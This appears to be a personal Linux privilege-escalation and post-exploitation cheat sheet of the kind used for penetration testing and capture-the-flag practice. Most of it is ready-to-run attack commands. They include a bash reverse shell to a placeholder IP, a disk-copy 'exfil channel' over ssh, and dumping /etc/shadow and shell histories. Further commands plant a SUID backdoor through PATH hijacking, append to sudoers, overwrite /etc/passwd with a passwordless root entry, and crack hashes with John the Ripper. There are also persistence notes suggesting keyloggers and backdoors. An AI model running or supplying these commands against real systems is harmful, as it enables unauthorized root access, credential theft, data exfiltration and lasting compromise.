GTFO Bins:
==========
# GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
https://gtfobins.github.io/


Commands:
=========
# check to see what sudo privledges the user has
sudo -l
cat /etc/sudoers

# other Super Users?:
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 {print $1}'


# show list of alias commands avalable
alias
# create alias
alias ll='ls -al'
# add to ~/.bashrc or ~/.bash_aliases

# remove aliases
unalias {NAME}
# remove all aliases
unalias -a

# user discovery
whoami
groups
id
pwd
who 
w
last

# use finger to see logged in user info
finger -s
Login     	Name       	Tty      Idle   Login Time   Office     Office Phone
<login-name> 	<user-name>    	tty7     13:53  Apr 25 12:37 (:0)
# use finger to see logged in user extra info
finger -l
Login: <login-name>     		Name: <user-name>
Directory: /home/mygu               	Shell: /bin/bash
On since Sat Apr 25 12:37 (PDT) on tty7 from :0
   13 hours 54 minutes idle
No mail.
No Plan.
# Finger users on a Specific IP
finger @TARGET-IP
# Finger a Specific Username
finger batman@TARGET-IP 
# Solaris bug that shows all logged in users:
finger 0@host  


# search
whereis (locate installed binaries on the system)
locate (find files within the system)
find 
# find file with name containing "file-name-filter", then search that file for specific "string"
find /path/to/directory -name "file-name-filter" -type f -exec grep -i "string" {} \; -print 2>/dev/null


# users and password hashes
cat /etc/passwd
cat /etc/shadow

# User History
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

# Machine discovery
uname -a
lsb_release -a
env
whoami
history

# Network configuration 
/sbin/ifconfig -a
iwconfig
ip addr
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
netstat -antup
lsof -i

# Public IP address
curl -4 icanhazip.com
dig +short myip.opendns.com @resolver1.opendns.com
wget -qO- ifconfig.me/ip

# lists available exploits Linux kernel in kali Linux
searchsploit Linux Kernel 2.6.24 


Grep hardcoded passwords:
=========================
# Use grep to look for user in filename
grep -i user [filename]
# Use grep to look for pass in filename
grep -i pass [filename]
# Use grep to look for password in filename
grep -C 5 "password" [filename]
# find php file and check them for the variable $password
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"


Spawn a Shell
=============
# use find command’s exec parameter for code execution (returns shell)
sudo find /home -exec sh -i \;
# use python to spawn a shell
sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
# use C to spawn a shell
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}


Reverse Shell (Builtin Netcat):
===============================
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1


Encrypted exfil channel:
========================
dd if=/dev/<disk-to-copy> bs=65536 conv=noerror, sync | ssh -C <user>@<ip-address> "cat > /tmp/image.dd"


Get Root shell from find, less, more:
=====================================
# check to see what sudo permissions the user has. 
sudo -l
# if find can be run by normal user
# this will grant a root shell
find /var/log -name messages -exec /bin/bash -i \;

# check to see what sudo permissions the user has. 
sudo -l
# get root shell via less or more:
less /var/log/messages
# once in less run:
!/bin/bash


find command that is suid or sgid or root:
==========================================
# will find both
find / -perm -4000 -o -perm -2000

# will find all files with SUID set 
find . -perm /4000 
OR
find / -perm -u=s -type f 2>/dev/null

Example Use: nmap with SUID set
# runs nmap interactive mode
nmap –interactive 
# escape to the system shell from nmap shell
nmap> !sh 
# check to see if you are root
whoami

# will find all files with SGID set
find . -perm /2000 
# will find all files with SUID & SGID set
find . -perm /6000
# Prints all commands that run as SUDO
sudo -l
sudo -ll
# services which are running as root
ps -aux | grep root
# check if web server runs as root
grep "localhost" ./ -R

Example Use: if /etc/exports is writable
# add an NFS entry adding the no_root_squash flag to a root directory
# add a binary with 
# add SUID bit on the file
chmod u+s file_name
# make file executable if not already
chmod o+x file_name
# run file. 

# Add username to sudoers in python.
# !/usr/bin/env python
import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()


If there is a cronjob that runs as root but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.

# list processes running by root, permissions and NFS exports
echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null


# if you have write permissions for /etc/passwd 
# back up current/etc/passwd
cp /etc/passwd /etc/passwd.bak
# overwrite /etc/passwd to gain root access
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su


Removing SUID/SGID
==================
# remove the SUID permissions
chmod u-s file_name
# remove the SUID permissions recursively on all files
for i in `find / -perm +4000`
do
	chmod u-s $i
done


# remove the SGID permissions
chmod g-s file_name
# remove the SGID permissions recursively on all files
for i in `find / -perm +2000`
do
	chmod g-s $i
done


ltrace to find were a program makes system calls:
=================================================
# find a program with Setuid used
find /usr/bin -perm -4000
# find a program that runs with root priveledges
ls -l </path/to/program>
# try program to see what it requires, maybe try a --help flag
# use ltrace to check to see if it calls another 
# script or program that we have access to
ltrace </path/to/program> <required options to run>
# look for system calls where the program is not a specific path
# for example if it calls grep without specifying a path
# if so create a script to run:

Grab Hash script:
=================
nano grep
#!/bin/dash
cat /etc/shadow
ctrl + x 		(note Bash likes to drop setuid permissions but Dash will not)
# make executable 
chmod 755 grep
# change PATH so it check your folder first when the program is run
export PATH=.:$PATH
# run the program that has root priveledges
# it should call your script and give you the output

auto-root script
================
nano grep 
#!/bin/dash
cp /bin/dash backdoor
chown root:root backdoor
chmod u+s backdoor
ctrl + x
# make executable 
chmod 755 grep
# change PATH so it check your folder first when the program is run
export PATH=.:$PATH
# run the program backdoor
./backdoor 
whoami
id
# you now have a root shell in dash


SMBclient:
==========
# Enumerate the Share
smbclient -L <IP>
smbclient -U <domain>\\<user> -L <IP>


Linux files to cat:
===================
.rhosts (allows remote logins)
~/.ssh/authorized_keys
~/.ansible.cfg
/etc/ansible/ansible.cfg (ansible config file)
/etc/ansible/hosts (list of ansible hosts)
/etc/apache2/ 
/etc/apache2/apache2.conf
/etc/apache2/conf/httpd.conf (Apache configuration file)
/etc/apache2/conf/sites-enabled/ (enabled Apache virtual hosts)
/etc/chttp.conf
/etc/cloud/cloud.cfg
/etc/ (configuration files)
/etc/crontab
/etc/cups/cupsd.conf
/etc/fstab
/etc/group (user groups)
/etc/host.conf
/etc/hosts
/etc/hosts (IP addresses of the specified hosts)
/etc/httpd/conf/httpd.conf
/etc/httpd/ (web server settings)
/etc/inetd.conf
inetd files (which can be used to start other network daemons)
/etc/init.d (all the startup scripts)
inittab  (initialization sequence)
/etc/lighttpd.conf
/etc/machine-id
/etc/mtab (dynamic file system information)
/etc/my.cnf.d/client.cnf (MySQL/MariaDB client configuration)
/etc/my.cnf.d/ (MySQL/MariaDB configurations are actually located)
/etc/my.cnf.d/server.cnf - MySQL/MariaDB server configuration
/etc/my.cnf (MySQL/MariaDB link to /etc/my.cnf.d)
/etc/my.conf
/etc/os-release
/etc/passwd (contains the user names)
/etc/php/php.ini (main PHP configuration file)
/etc/profile 
/etc/protocols (list of IP protocols)
/etc/resolv.conf (DNS)
/etc/services (port names for network services)
/etc/shadow (contains the hashed passwords)
/etc/ssh/ (configuration files and SSH keys)
/etc/ssh/ssh_config (SSH client configuration file)
/etc/ssh/sshd_config (SSH server configuration file)
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_* (other formats)
/etc/syslog.conf
/etc/systemd/ (directory with Systemd files)
/etc/systemd/resolved.conf
/opt/lampp/etc/httpd.conf
/proc/cmdline (Kernel command line information)
/proc/console (Information about current consoles including tty)
/proc/cpuinfo
/proc/devices (Device drivers currently configured for the running kernel)
/proc/dma (Info about current DMA channels)
/proc/fb (Framebuffer devices)
/proc/filesystems (Current filesystems supported by the kernel)
/proc/iomem (Current system memory map for devices)
/proc/ioports (Registered port regions for input output communication with device)
/proc/keys
/proc/key-users
/proc/loadavg (System load average)
/proc/locks (Files currently locked by kernel)
/proc/meminfo (Info about system memory)
/proc/misc (Miscellaneous drivers registered for miscellaneous major device)
/proc/modules (Currently loaded kernel modules)
/proc/mounts (List of all mounts in use by system)
/proc/net/fib_trie (IPv4 info)
/proc/net/if_inet6 (IPv6 info)
/proc/net/route
/proc/net/snmp
/proc/net/tcp (3500007F translates to 127.0.0.53)
/proc/net/unix (running processes)
/proc/partitions (Detailed info about partitions available to the system)
/proc/pci (Information about every PCI device)
/proc/stat (Record or various statistics kept from last reboot)
/proc/swap (Information about swap space)
/proc/uptime (Uptime information in seconds)
/proc/version (Kernel version, gcc version, and Linux distribution installed)
/proc/ (Virtual File System containing info about processes and other system information)
/proc/vmstat
/run (Information about the system since it was loaded)
/tmp
/var/log/apache2/ (Apache web server logs)
/var/log/ (directory contains the logs of various programs and services)
/var/log/httpd/ (Apache web server logs)
/var/log/wtmp  (login log files)


Linux Password Info:
====================
Example Password: $1$Etg2ExUZ$F9NTP7omafhKIlqaBMqng1
		  $[ALGORITHM]$[SALT]$[HASH of SALT+PASSWORD]

1. first field tell's you the hashing algorithm
-----------------------------------------------
$1 = MD5 		22 characters
$2 = Blowfish 		
$2a= eksblowfish 	
$5 = SHA-256 		43 characters
$6 = SHA-512 		86 characters

2. The second field is the salt value
3. The last field is the hash value of salt+password

John the Ripper:
================
# bench test John the Ripper
john --test
# make the shadowfile readable by John the Ripper
unshadow /etc/passwd /etc/shadow > /tmp/crack
# use John with a wordlist, use built-in mangling rules, and save to file
john --wordlist=/PATH/TO/WORDLIST --rules /tmp/crack
# show cracked passwords status
john --status
# show cracked passwords
john --show /tmp/crack 
# restore an interrupted session
john --restore


Generate MD5 password hash:
===========================
python -c "import random,string,crypt;
randomsalt = ''.join(random.sample(string.ascii_letters,8));
print crypt.crypt('MySecretPassword', '\$1\$%s\$' % randomsalt)"
---
$1$YjOzcqrf$Zqx4sx5CQRuEIFCdOLAJV0

Generate SHA-256 password hash:
===============================
python -c "import random,string,crypt;
randomsalt = ''.join(random.sample(string.ascii_letters,8));
print crypt.crypt('MySecretPassword', '\$5\$%s\$' % randomsalt)"
---
$5$LgsPuaeR$OCtm.3tpbS/wyOZAIy6dsVNP4x0GyohyGebkIz15e88

Generate SHA-512 password hash:
===============================
python -c "import random,string,crypt;
randomsalt = ''.join(random.sample(string.ascii_letters,8));
print crypt.crypt('MySecretPassword', '\$6\$%s\$' % randomsalt)"
---
$6$HMpFTkgb$WqzuqMqYbjWsXFrOtvZPo.1gIkH6HiXJGr4QPv.k26jE.3mE.sdf3dds[...]

BASE64 encode/decode:
=====================
# BASE64 encode
echo 'Hello World!' | base64
# BASE64 decode
'SGVsbG8gV29ybGQhCg==' | base64 -d


Evercookie:
===========
https://samy.pl/evercookie/
https://github.com/samyk/evercookie


Permanance:
===========
add contents to /etc/skel directory so it will be installed on every new users account
The /etc/skel directory contains files and directories that are automatically copied over 
to a new user's when it is created from useradd command. This will ensure that all the users 
gets same intial settings and environment.

could install keyloggers, backdoors, ssh keys
add ~/.bash_aliases
crontab addition?? python to run zip file


Use Python to run script in zip file:
=====================================
mkdir test
echo 'print("Hello World!!") > test/__main__.py
zip -j test.zip test/*
python test.zip